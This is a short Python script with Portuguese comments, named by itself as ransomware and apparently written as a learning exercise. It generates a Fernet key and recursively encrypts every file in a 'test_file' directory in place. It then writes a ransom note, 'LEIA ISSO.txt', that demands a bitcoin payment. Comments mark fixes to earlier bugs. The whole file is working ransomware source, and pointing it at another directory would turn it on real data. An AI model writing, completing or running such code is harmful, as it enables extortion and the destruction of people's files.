from cryptography.fernet import Fernet
import os


# 1. Gerar uma chave e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar a chave salva
def carregar_chave():
    # CORRIGIDO: Necessário reabrir o arquivo e usar .read() dentro do bloco 'with'.
    with open("chave.key", "rb") as chave_file:
        return chave_file.read()
            
# 3. Criptografar um unico arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    
    # Indentação corrigida.
    with open(arquivo, "rb") as file:
        dados = file.read()
        
    dados_encriptados = f.encrypt(dados)
    
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# 4. encontrar arquivos para encriptografar
def encontra_arquivos(diretorio):
    lista = []
    # No loop os.walk, o terceiro item (arquivos_na_pasta) contém a lista de nomes de arquivos.
    for raiz, _, arquivos_na_pasta in os.walk(diretorio):
        # Corrigida a referência da variável de loop.
        for nome in arquivos_na_pasta:
            caminho = os.path.join(raiz, nome)
            
            # CORRIGIDO: Lógica de exclusão de arquivos para evitar autodescriptografia.
            # Exclui o próprio script (assumindo o nome) e qualquer arquivo .key
            if nome != "ransoware.py" and not nome.endswith(".key") and nome != "LEIA ISSO.txt":
                lista.append(caminho)
    return lista

# 5 Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie um bitcoin para o endereço x e envie o comprovante para Y\n")
        f.write("Depois disso, devolveremos seus dados!\n")
    
# 6. Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontra_arquivos("test_file")
    
    # Sintaxe do loop 'for' corrigida (adicionado o ':').
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografados")

if __name__=="__main__":
    main()
